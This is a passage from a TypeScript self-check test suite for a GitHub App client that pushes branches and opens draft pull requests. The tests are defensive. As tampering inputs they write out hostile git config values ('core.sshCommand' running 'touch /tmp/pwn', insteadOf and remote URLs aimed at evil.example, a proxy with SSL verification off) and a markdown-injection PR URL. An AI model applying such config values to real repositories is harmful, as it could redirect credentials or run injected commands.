    await section("pushBranch: a bare repository whose config could redirect the token is refused before a token is minted", async () => {
      for (const [key, value] of [["http.proxy", "http://127.0.0.1:9"], ["http.https://github.com/.sslVerify", "false"], ["url.https://evil.example/.insteadOf", "https://github.com/"], ["include.path", "/tmp/x"], ["core.sshCommand", "touch /tmp/pwn"], [`remote.${target}.url`, "https://evil.example/x.git"], ["extensions.worktreeConfig", "true"]] as const) {
        const tampered = join(root, `tampered-${key.replace(/[^a-z]/gi, "")}.git`);
        sh(["clone", "-q", "--bare", source, tampered]);
        sh(["-C", tampered, "config", key, value]);
        const before = mints(mintRoute.sent);
        const c = appClient({ app: APP, pem: PEM, fetch: mintRoute.fetch, git: localGit, bareRepo: tampered, home, remote: target, now: () => NOW });
        const r = await c.pushBranch({ branch: BRANCH, commit: tip });
        ok(!r.ok && r.final === true && r.detail.toLowerCase().includes(key.toLowerCase().split(".")[0]) && mints(mintRoute.sent) === before, `${key}: refused as final, no token minted`);
      }
    });

    await section("pushBranch: a proxy in config.worktree, which --local alone doesn't list, is refused", async () => {
      const tampered = join(root, "tampered-worktree.git");
      sh(["clone", "-q", "--bare", source, tampered]);
      writeFileSync(join(tampered, "config.worktree"), "[http]\n\tproxy = http://127.0.0.1:9\n\tsslVerify = false\n");
      const before = mints(mintRoute.sent);
      // Without the extension git doesn't read config.worktree at all: the allowlist passes, and so does the push.
      const fresh = join(root, "fresh-target.git");
      sh(["init", "-q", "--bare", fresh]);
      const plain = await appClient({ app: APP, pem: PEM, fetch: mintRoute.fetch, git: localGit, bareRepo: tampered, home, remote: fresh, now: () => NOW }).pushBranch({ branch: BRANCH, commit: tip });
      ok(plain.ok, "a stray config.worktree that git doesn't read leaves the push as it was");
      sh(["-C", tampered, "config", "extensions.worktreeConfig", "true"]);
      const r = await appClient({ app: APP, pem: PEM, fetch: mintRoute.fetch, git: localGit, bareRepo: tampered, home, remote: target, now: () => NOW }).pushBranch({ branch: BRANCH, commit: tip });
      ok(!r.ok && r.final === true && r.detail.includes("http.proxy (worktree)") && r.detail.includes("extensions.worktreeconfig (local)") && mints(mintRoute.sent) === before + 1, "with the extension on, the worktree file's proxy is named by its scope, and the push refused unminted");
    });

    await section("pushBranch: a config that can't be read is a retry, with no token minted and no push", async () => {
      const before = mints(mintRoute.sent);
      const c = appClient({ app: APP, pem: PEM, fetch: mintRoute.fetch, git: async (argv) => (argv.includes("config") ? { code: 1, stdout: "", stderr: "fatal: bad config line 3" } : { code: 0, stdout: "", stderr: "" }), bareRepo: source, home, remote: target, now: () => NOW });
      const r = await c.pushBranch({ branch: BRANCH, commit: tip });
      ok(!r.ok && !r.final && r.detail.includes("bad config line 3") && mints(mintRoute.sent) === before, "not pushed, not final, no token");
    });

    await section("pushBranch: a config listing whose git throws is a result, never a throw", async () => {
      const c = appClient({ app: APP, pem: PEM, fetch: mintRoute.fetch, git: async (argv) => { if (argv.includes("config")) throw new Error(`spawn EAGAIN ${TOKEN}`); return { code: 0, stdout: "", stderr: "" }; }, bareRepo: source, home, remote: target, now: () => NOW });
      let threw = false;
      let r: Awaited<ReturnType<typeof c.pushBranch>> | null = null;
      try {
        r = await c.pushBranch({ branch: BRANCH, commit: tip });
      } catch {
        threw = true;
      }
      ok(!threw && r !== null && !r.ok && !r.final && r.detail.includes("config threw"), "a retry, saying the config read threw");
    });

    await section("repoConfigProblems: the allowlist, in every scope but the command line's", () => {
      const listing = "local\tcore.repositoryformatversion\nlocal\tcore.bare\nlocal\tremote.origin.url\nlocal\tgc.auto\nlocal\tmaintenance.auto\ncommand\tprotocol.file.allow\n";
      ok(repoConfigProblems(listing).length === 0, "what a bare clone and run.ts write, plus the command line, pass");
      ok(repoConfigProblems("local\textensions.refstorage\nlocal\tmaintenance.strategy\nlocal\textensions.objectformat\n").length === 0, "a reftable clone's extension, git maintenance register's strategy and a SHA-256 repo's format pass: refusing them would stop every run");
      ok(JSON.stringify(repoConfigProblems(`${listing}worktree\tcore.bare\nlocal\tremote.origin.pushurl\nglobal\tuser.name\n`)) === JSON.stringify(["core.bare (worktree)", "remote.origin.pushurl (local)", "user.name (global)"]), "an allowed key in another scope, a key past the list, and any other scope are named");
    });

    await section("pushCommand's header reaches github.com alone (git's own URL matching)", () => {
      const c = pushCommand({ bareRepo: source, remote: "https://github.com/MHarris-SgyMd/OB1.git", branch: BRANCH, commit: tip, token: TOKEN, home });
      const at = (url: string): string => {
        const r = Bun.spawnSync([git, "config", "--get-urlmatch", "http.extraheader", url], { env: c.env, cwd: "/", stdout: "pipe", stderr: "pipe" });
        return r.stdout.toString().trim();
      };
      ok(at("https://github.com/MHarris-SgyMd/OB1.git").startsWith("AUTHORIZATION: basic "), "https://github.com/… gets it");
      ok(at("https://github.com.evil.test/x.git") === "" && at("http://github.com/x.git") === "" && at("https://example.test/x.git") === "", "a look-alike host, plain http and another host don't");
    });

    await section("pushBranch: a token that can't be minted is a retry, and git doesn't run", async () => {
      const c = appClient({ app: APP, pem: PEM, fetch: stubFetch(() => json({ message: "Bad credentials" }, 401)).fetch, git: localGit, bareRepo: source, home, remote: target, now: () => NOW });
      const before = seen.filter((x) => x.argv.includes("push")).length;
      const r = await c.pushBranch({ branch: BRANCH, commit: tip });
      ok(!r.ok && !r.final && r.detail.includes("401") && seen.filter((x) => x.argv.includes("push")).length === before, "not pushed, not final, no push run");
    });

    await section("pushBranch: git's own words are scrubbed of the token, in either form", async () => {
      const basic = Buffer.from(`x-access-token:${TOKEN}`).toString("base64");
      const c = appClient({ app: APP, pem: PEM, fetch: mintRoute.fetch, git: async (argv) => (argv.includes("push") ? { code: 128, stdout: "", stderr: `fatal: header AUTHORIZATION: basic ${basic} refused for ${TOKEN}` } : { code: 0, stdout: "local\tcore.bare\n", stderr: "" }), bareRepo: source, home, remote: target, now: () => NOW });
      const r = await c.pushBranch({ branch: BRANCH, commit: tip });
      const fragments = [TOKEN.slice(0, 40), TOKEN.slice(200, 240), basic.slice(0, 40), basic.slice(100, 140)];
      ok(!r.ok && !r.final && r.detail.includes("exited 128") && fragments.every((x) => !r.detail.includes(x)), "a failed push's detail carries no piece of the token or its basic-auth form, however git's words are cut");
    });

    await section("pushBranch: a throwing git is a result with the token scrubbed", async () => {
      const c = appClient({ app: APP, pem: PEM, fetch: mintRoute.fetch, git: async (argv) => { if (argv.includes("push")) throw new Error(`spawn failed near ${TOKEN}`); return { code: 0, stdout: "local\tcore.bare\n", stderr: "" }; }, bareRepo: source, home, remote: target, now: () => NOW });
      const r = await c.pushBranch({ branch: BRANCH, commit: tip });
      ok(!r.ok && !r.final && r.detail.includes("git push threw") && !r.detail.includes(TOKEN.slice(4, 24)), "a result, not thrown, no piece of the token left");
    });
  } finally {
    rmSync(root, { recursive: true, force: true });
  }

  /** A PR client over a routed stand-in, minting from the token route. */
  const prClient = (route: (m: string, u: string, b: unknown) => Response | null) => {
    const f = stubFetch((m, u, b) => tokenRoute(m, u) ?? route(m, u, b) ?? json({ message: "unrouted" }, 404));
    const c = appClient({ app: APP, pem: PEM, fetch: f.fetch, git: async () => ({ code: 1, stdout: "", stderr: "" }), bareRepo: "/nowhere", home: "/nowhere", now: () => NOW });
    return { c, sent: f.sent };
  };
  const LIST = `https://api.github.com/repos/MHarris-SgyMd/OB1/pulls?state=open&per_page=10&head=${encodeURIComponent(`MHarris-SgyMd:${BRANCH}`)}`;
  const PULLS = "https://api.github.com/repos/MHarris-SgyMd/OB1/pulls";
  const OPEN = { title: "[core] Fix the thing (SMD-1234)", head: BRANCH, base: "main", body: "the body" };

  await section("openDraftPr: none open — a draft PR from the branch, to main, with the body", async () => {
    let posted: Record<string, unknown> | null = null;
    const { c, sent } = prClient((m, u, b) => (m === "GET" && u === LIST ? json([]) : m === "POST" && u === PULLS ? ((posted = b as Record<string, unknown>), json(prRow(), 201)) : null));
    const r = await c.openDraftPr(OPEN);
    ok(r.ok && r.number === 901 && r.url === "https://github.com/MHarris-SgyMd/OB1/pull/901", "the PR's number and URL");
    ok(JSON.stringify(posted) === JSON.stringify({ title: OPEN.title, head: BRANCH, base: "main", body: "the body", draft: true }), "posted as a draft, head the branch of this repo, base main");
    ok(sent.filter((s) => s.url.startsWith("https://api.github.com/repos/")).every((s) => (s.init.headers as Record<string, string>).Authorization === `Bearer ${TOKEN}`), "the installation token, not the JWT, goes to the repo's API");
    ok(mints(sent) === 1 && revoked(sent).join() === TOKEN && sent.at(-1)?.init.method === "DELETE", "one token, revoked last");
  });

  await section("openDraftPr: the App's PR already open from the branch is the answer — no second PR", async () => {
    const { c, sent } = prClient((m, u) => (m === "GET" && u === LIST ? json([prRow({ number: 900, html_url: "https://github.com/MHarris-SgyMd/OB1/pull/900" })]) : null));
    const r = await c.openDraftPr(OPEN);
    ok(r.ok && r.number === 900 && !sent.some((s) => s.init.method === "POST" && s.url === PULLS), "PR 900 is answered, nothing posted");
  });

  await section("openDraftPr: an open PR from the branch that isn't the App's, or isn't this repo's, isn't taken for it", async () => {
    for (const [what, row] of [
      ["someone else's", prRow({ user: { login: "MHarris-SgyMd" } })],
      ["from another repo's branch", prRow({ head: { ref: BRANCH, repo: { full_name: "someone/OB1" } } })],
      ["of another branch", prRow({ head: { ref: "agent/smd-1-other", repo: { full_name: "MHarris-SgyMd/OB1" } } })],
      ["with a URL elsewhere", prRow({ html_url: "https://evil.example/pull/900" })],
      ["with a URL past its number", prRow({ html_url: "https://github.com/MHarris-SgyMd/OB1/pull/900/files" })],
      ["with a path out of the repo", prRow({ html_url: "https://github.com/MHarris-SgyMd/OB1/pull/../../evil/pull/900" })],
      ["with markdown in its URL", prRow({ html_url: "https://github.com/MHarris-SgyMd/OB1/pull/1) **approve** [x](https://evil.example/a) (https://github.com/MHarris-SgyMd/OB1/pull/900" })],
      ["whose number isn't its URL's", prRow({ number: 7 })],
      ["with a number past ten digits", prRow({ number: 2 ** 60, html_url: `https://github.com/MHarris-SgyMd/OB1/pull/${2 ** 60}` })],
      ["with its own number, then more path", prRow({ number: 900, html_url: "https://github.com/MHarris-SgyMd/OB1/pull/900/files" })],
    ] as const) {
      let postedN = 0;
      const { c } = prClient((m, u) => (m === "GET" && u === LIST ? json([row]) : m === "POST" && u === PULLS ? (postedN++, json(prRow(), 201)) : null));
      const r = await c.openDraftPr(OPEN);
      ok(r.ok && r.number === 901 && postedN === 1, `${what}: passed over, and the App's own PR opened`);
    }
  });

  await section("openDraftPr: a 422 whose PR turns up is the PR; no commits, a bad base or someone else's PR is final; any other 422 is retried", async () => {
    let lists = 0;
    const lost = prClient((m, u) => (m === "GET" && u === LIST ? (lists++ === 0 ? json([]) : json([prRow()])) : m === "POST" && u === PULLS ? json({ message: "Validation Failed", errors: [{ message: "A pull request already exists" }] }, 422) : null));
    const r1 = await lost.c.openDraftPr(OPEN);
    ok(r1.ok && r1.number === 901, "a lost answer: the PR is found after the 422");
    const none = prClient((m, u) => (m === "GET" && u === LIST ? json([]) : m === "POST" && u === PULLS ? json({ message: "Validation Failed", errors: [{ resource: "PullRequest", code: "custom", message: "No commits between main and agent/smd-1234-fix-the-thing" }] }, 422) : null));
    const r2 = await none.c.openDraftPr(OPEN);
    ok(!r2.ok && r2.final === true && r2.detail.includes("422") && r2.detail.includes("Validation Failed; No commits between"), "no commits between: final, in GitHub's words from errors[]");
    const badHead = await prClient((m, u) => (m === "GET" && u === LIST ? json([]) : m === "POST" && u === PULLS ? json({ message: "Validation Failed", errors: [{ resource: "PullRequest", field: "head", code: "invalid" }] }, 422) : null)).c.openDraftPr(OPEN);
    ok(!badHead.ok && !badHead.final, "a head GitHub doesn't take yet (just after the push): retried");
    const badBase = await prClient((m, u) => (m === "GET" && u === LIST ? json([]) : m === "POST" && u === PULLS ? json({ message: "Validation Failed", errors: [{ resource: "PullRequest", field: "base", code: "invalid" }] }, 422) : null)).c.openDraftPr(OPEN);
    ok(!badBase.ok && badBase.final === true, "a base GitHub won't take: final");
    const theirs = await prClient((m, u) => (m === "GET" && u === LIST ? json([prRow({ user: { login: "MHarris-SgyMd" } })]) : m === "POST" && u === PULLS ? json({ message: "Validation Failed", errors: [{ resource: "PullRequest", code: "custom", message: "A pull request already exists for MHarris-SgyMd:agent/smd-1234-fix-the-thing." }] }, 422) : null)).c.openDraftPr(OPEN);
    ok(!theirs.ok && theirs.final === true && theirs.detail.includes("not the App's"), "a PR from the branch that someone else opened: final, saying so, not retried forever");
    const spam = await prClient((m, u) => (m === "GET" && u === LIST ? json([]) : m === "POST" && u === PULLS ? json({ message: "Validation Failed", errors: [{ message: "was submitted too quickly" }] }, 422) : null)).c.openDraftPr(OPEN);
    ok(!spam.ok && !spam.final && spam.detail.includes("too quickly"), "any other 422 (an abuse limit) is retried");
    let calls = 0;
    const flaky = await prClient((m, u) => (m === "GET" && u === LIST ? (calls++ === 0 ? json([]) : json({ message: "Server Error" }, 502)) : m === "POST" && u === PULLS ? json({ message: "Validation Failed", errors: [{ message: "A pull request already exists for MHarris-SgyMd:agent/smd-1234-fix-the-thing." }] }, 422) : null)).c.openDraftPr(OPEN);
    ok(!flaky.ok && !flaky.final && flaky.detail.includes("already exists") && flaky.detail.includes("502"), "a 422 whose follow-up lookup fails is retried, not final");
  });

  await section("openDraftPr: other failures are retried, scrubbed, never thrown", async () => {
    const r500 = await prClient((m, u) => (m === "GET" && u === LIST ? json([]) : m === "POST" && u === PULLS ? json({ message: `boom near ${TOKEN}` }, 500) : null)).c.openDraftPr(OPEN);
    ok(!r500.ok && !r500.final && r500.detail.includes("500") && !r500.detail.includes(TOKEN), "a 500: a retry, the token scrubbed from GitHub's words");
    const listFails = await prClient((m, u) => (m === "GET" && u === LIST ? json({ message: "Resource not accessible by integration" }, 403) : null)).c.openDraftPr(OPEN);
    ok(!listFails.ok && !listFails.final && listFails.detail.includes("403") && listFails.detail.includes("not accessible"), "a refused lookup: a retry, nothing posted");
    const f = stubFetch((m, u) => tokenRoute(m, u) ?? Promise.reject(new Error(`socket hang up ${TOKEN}`)));
    const thrown = await appClient({ app: APP, pem: PEM, fetch: f.fetch, git: realGitSpawn, bareRepo: "/x", home: "/x", now: () => NOW }).openDraftPr(OPEN);
    ok(!thrown.ok && !thrown.final && thrown.detail.includes("socket hang up") && !thrown.detail.includes(TOKEN.slice(4, 24)), "a transport failure: a result, no piece of the token left");
    const weird = await prClient((m, u) => (m === "GET" && u === LIST ? json([]) : m === "POST" && u === PULLS ? json(prRow({ user: { login: "someone" } }), 201) : null)).c.openDraftPr(OPEN);
    ok(!weird.ok && !weird.final && weird.detail.includes("isn't the App's"), "a 201 answering someone else's PR is not taken, and retried");
    const notList = await prClient((m, u) => (m === "GET" && u === LIST ? json({ message: "odd" }) : null)).c.openDraftPr(OPEN);
    ok(!notList.ok && !notList.final && notList.detail.includes("isn't a list"), "a PR lookup that answers something not a list is a retry");
  });

  await section("openDraftPr: the repo's case in the config doesn't turn the App's own PR into a stranger's", async () => {
    const f = stubFetch((m, u) => tokenRoute(m, u) ?? (m === "GET" && u.includes("/pulls?state=open") ? json([]) : m === "POST" && u.endsWith("/pulls") ? json(prRow(), 201) : null) ?? json({}, 404));
    const c = appClient({ app: { ...APP, repo: "mharris-sgymd/ob1" }, pem: PEM, fetch: f.fetch, git: realGitSpawn, bareRepo: "/x", home: "/x", now: () => NOW });
    const r = await c.openDraftPr(OPEN);
    ok(r.ok && r.number === 901, "a 201 answering https://github.com/MHarris-SgyMd/OB1/pull/901 is the PR, for a config saying mharris-sgymd/ob1");
  });

  await section("installationRepos: what the installation reaches, read with a token for the whole of it, then revoked", async () => {
    let asked: unknown = null;
    const page = (n: number, from: number) => Array.from({ length: n }, (_, i) => ({ full_name: `o/r${from + i}` }));
    const f = stubFetch((m, u, b) =>
      m === "POST" && u.endsWith("/access_tokens") ? ((asked = b), json({ token: TOKEN, permissions: { metadata: "read" } }, 201))
      : m === "GET" && u.endsWith("/installation/repositories?per_page=100&page=1") ? json({ total_count: 101, repositories: page(100, 0) })
      : m === "GET" && u.endsWith("/installation/repositories?per_page=100&page=2") ? json({ total_count: 101, repositories: [{ full_name: "MHarris-SgyMd/OB1" }] })
      : m === "DELETE" ? new Response(null, { status: 204 }) : json({}, 404));
    const r = await installationRepos(f.fetch, APP, PEM, NOW);
    ok(r.ok && r.repos.length === 101 && r.repos.at(-1) === "MHarris-SgyMd/OB1", "every page is read: 101 repositories");
    ok(JSON.stringify(asked) === JSON.stringify({ permissions: { metadata: "read" } }), "the token is asked for metadata alone, and for no repository in particular (a narrowed one lists only its own)");
    ok(revoked(f.sent).join() === TOKEN, "the token is revoked after");
    const refused = stubFetch((m) => (m === "DELETE" ? new Response(null, { status: 204 }) : m === "POST" ? json({ token: TOKEN }, 201) : json({ message: `no ${TOKEN}` }, 403)));
    const r2 = await installationRepos(refused.fetch, APP, PEM, NOW);
    ok(!r2.ok && r2.detail.includes("403") && !r2.detail.includes(TOKEN.slice(4, 24)) && revoked(refused.sent).join() === TOKEN, "a refused list is said, scrubbed, and the token still revoked");
    const oddShape = stubFetch((m) => (m === "DELETE" ? new Response(null, { status: 204 }) : json({ token: `${TOKEN}\n` }, 201)));
    const r3 = await installationRepos(oddShape.fetch, APP, PEM, NOW);
    ok(!r3.ok && revoked(oddShape.sent).join() === TOKEN, "a metadata token of an odd shape is refused and revoked");
    const huge = stubFetch((m, u) => (m === "DELETE" ? new Response(null, { status: 204 }) : m === "POST" ? json({ token: TOKEN }, 201) : json({ repositories: page(100, Number(/page=(\d+)/.exec(u)?.[1] ?? 0) * 100) })));
    const r4 = await installationRepos(huge.fetch, APP, PEM, NOW);
    ok(!r4.ok && r4.detail.includes("over 1,000") && huge.sent.filter((x) => x.url.includes("/installation/repositories")).length === 10, "past ten full pages the list stops, refused, its token revoked");
    const throws = stubFetch((m) => (m === "DELETE" ? new Response(null, { status: 204 }) : m === "POST" ? json({ token: TOKEN }, 201) : Promise.reject(new Error(`reset near ${TOKEN}`))));
    const r5 = await installationRepos(throws.fetch, APP, PEM, NOW);
    ok(!r5.ok && r5.detail.includes("reset near") && !r5.detail.includes(TOKEN.slice(4, 24)) && revoked(throws.sent).join() === TOKEN, "a list request that throws: a result, scrubbed, the token revoked");
    const unrevoked = stubFetch((m) => (m === "DELETE" ? new Response(null, { status: 500 }) : m === "POST" ? json({ token: TOKEN }, 201) : json({ repositories: [{ full_name: "MHarris-SgyMd/OB1" }] })));
    const r6 = await installationRepos(unrevoked.fetch, APP, PEM, NOW);
    ok(r6.ok && r6.revoked === false, "a revoke that doesn't land is told to the caller");
  });

  await section("openDraftPr: a head outside the runner's prefix is refused, nothing sent", async () => {
    const { c, sent } = prClient(() => null);
    const r = await c.openDraftPr({ ...OPEN, head: "MHarris-SgyMd:main" });
    ok(!r.ok && r.final === true && sent.length === 0, "refused as final, no request");
  });

  await section("checkGithubApp end to end: a stand-in GitHub, a fake gh on PATH, and every failure said with its reason", async () => {
    const dir = mkdtempSync(join(tmpdir(), "ghapp-check-"));
    const savedPath = process.env.PATH;
    try {
      const rulesets = join(import.meta.dir, "../../.github/rulesets");
      const ghScript = (works: boolean) => `#!/bin/sh\n${works ? `case "$*" in\n  *rulesets\\?*) printf '1\\n2\\n3\\n' ;;\n  *rulesets/1*) cat '${rulesets}/main.json' ;;\n  *rulesets/2*) cat '${rulesets}/main-merge.json' ;;\n  *rulesets/3*) cat '${rulesets}/tags.json' ;;\nesac\n` : "echo 'HTTP 401: Bad credentials' >&2\nexit 1\n"}`;
      /** A directory holding a fake `gh` that runs `script`. */
      const bin = (name: string, script: string): string => {
        const d = join(dir, name);
        mkdirSync(d);
        writeFileSync(join(d, "gh"), script);
        chmodSync(join(d, "gh"), 0o755);
        return d;
      };
      const goodBin = bin("good", ghScript(true));
      const halfBin = bin("half", `#!/bin/sh\ncase "$*" in\n  *rulesets\\?*) printf 'junk\\n1\\n\\n2\\n3\\n' ;;\n  *rulesets/1*) echo 'HTTP 500' >&2; exit 1 ;;\n  *rulesets/2*) cat '${rulesets}/main-merge.json' ;;\n  *rulesets/3*) cat '${rulesets}/tags.json' ;;\nesac\n`);
      const badBin = bin("bad", ghScript(false));
      const emptyBin = join(dir, "none");
      mkdirSync(emptyBin);
      const cfg = { team: "SMD", initiative: "I", maintainerLinearId: "x", repo: "MHarris-SgyMd/OB1", mainCheckout: "/x", restUrl: null, githubAppId: "123456", githubAppInstallationId: "7890", githubAppSlug: "ob1-agent-runner" };
      const META = TOKEN.replace("123456", "777777");
      const bearer = (init?: RequestInit) => String((init?.headers as Record<string, string> | undefined)?.Authorization ?? "").replace(/^Bearer /, "");
      const github = (over: { app?: Response; installation?: Response; mint?: Response; repos?: Response; revokeMeta?: number; revokePublish?: number } = {}) => {
        const f = stubFetch((m, u, b) =>
          m === "GET" && u.endsWith("/app") ? (over.app ?? json({ slug: "ob1-agent-runner", permissions: { contents: "write", pull_requests: "write", metadata: "read" } }))
          : m === "GET" && u.endsWith("/app/installations/7890") ? (over.installation ?? json({ repository_selection: "selected" }))
          : m === "POST" && u.endsWith("/access_tokens") ? ((b as { repositories?: unknown })?.repositories ? (over.mint ?? tokenAnswer()) : json({ token: META, permissions: { metadata: "read" } }, 201))
          : m === "GET" && u.includes("/installation/repositories") ? (over.repos ?? json({ total_count: 1, repositories: [{ full_name: "MHarris-SgyMd/OB1" }] }))
          : json({}, 404));
        // DELETE answers by the token it revokes, so each revoke can fail on its own.
        const fetch: Fetch = async (u, init = {}) =>
          (init.method ?? "GET") === "DELETE" ? (f.sent.push({ url: u, init }), new Response(null, { status: bearer(init) === META ? (over.revokeMeta ?? 204) : (over.revokePublish ?? 204) })) : f.fetch(u, init);
        return { fetch, sent: f.sent };
      };
      process.env.PATH = `${goodBin}:/usr/bin:/bin`;
      const good = await checkGithubApp(cfg, PEM, github().fetch);
      ok(good.ok && good.lines.every((l) => l.startsWith("✓")) && good.lines.length === 7, "the App as decision 13's and the repo's three rulesets as recorded: seven ✓ and ok");
      const down = await checkGithubApp(cfg, PEM, github({ app: json({ message: "boom" }, 500) }).fetch);
      ok(!down.ok && down.lines.some((l) => l.startsWith("✗") && l.includes("GitHub answered 500")), "a 500 on GET /app is said as GitHub's 500, not as a wrong key");
      const g1 = github();
      await checkGithubApp(cfg, PEM, g1.fetch);
      ok(g1.sent.filter((x) => (x.init.method ?? "GET") === "GET").every((x) => x.init.redirect === "manual"), "its GETs follow no redirect (SAFE_REQUEST)");
      for (const [which, over] of [["the metadata token's", { revokeMeta: 500 }], ["the publish token's", { revokePublish: 500 }]] as const) {
        const r = await checkGithubApp(cfg, PEM, github(over).fetch);
        ok(!r.ok && r.lines.some((l) => l.includes("couldn't be revoked")), `${which} revoke not landing fails the check, saying so`);
      }
      const noMint = await checkGithubApp(cfg, PEM, github({ mint: json({ message: "Resource not accessible by integration" }, 403) }).fetch);
      ok(!noMint.ok && noMint.lines.some((l) => l.startsWith("✗") && l.includes("couldn't be minted") && l.includes("403")), "the publish's token refused alone fails the check, saying why");
      const noInst = await checkGithubApp(cfg, PEM, github({ installation: json({ message: "Not Found" }, 404) }).fetch);
      ok(!noInst.ok && noInst.lines.some((l) => l.includes("installation couldn't be read") && l.includes("GitHub answered 404")), "a missing installation is said with GitHub's 404");
      const noRepos = await checkGithubApp(cfg, PEM, github({ repos: json({ message: "Bad credentials" }, 401) }).fetch);
      ok(!noRepos.ok && noRepos.lines.some((l) => l.includes("repositories couldn't be read") && l.includes("401")), "a refused repository list is said with its reason");
      const noSign = await checkGithubApp(cfg, "-----BEGIN RSA PRIVATE KEY-----\nAAAA\n-----END RSA PRIVATE KEY-----", github().fetch);
      ok(!noSign.ok && noSign.lines.some((l) => l.includes("couldn't sign a JWT")), "a key that can't sign is said as such");
      process.env.PATH = `${halfBin}:/usr/bin:/bin`;
      const half = await checkGithubApp(cfg, PEM, github().fetch);
      ok(!half.ok && half.lines.some((l) => l.includes("ruleset 1") && l.includes("HTTP 500")), "one ruleset that can't be read fails the check, though the two fences read fine: a partial list isn't judged");
      process.env.PATH = `${badBin}:/usr/bin:/bin`;
      const loggedOut = await checkGithubApp(cfg, PEM, github().fetch);
      ok(!loggedOut.ok && loggedOut.lines.filter((l) => l.includes("rulesets")).length === 1 && loggedOut.lines.some((l) => l.includes("Bad credentials")), "gh refused: one line, with gh's words");
      process.env.PATH = `${emptyBin}`;
      const noGh = await checkGithubApp(cfg, PEM, github().fetch);
      ok(!noGh.ok && noGh.lines.some((l) => l.includes("gh isn't installed")), "no gh: said so");
    } finally {
      process.env.PATH = savedPath;
      rmSync(dir, { recursive: true, force: true });
    }
  });

  console.log(`${passed} passed, ${failed} failed`);
  console.log(failed ? `${failed} failed` : "all passed");
  return failed ? 1 : 0;
}

if (import.meta.main) {
  if (!process.argv.slice(2).includes("--self-check")) {
    console.error("usage: bun scripts/agent-runner/github-check.ts --self-check");
    process.exit(2);
  }
  process.exit(await selfCheck());
}
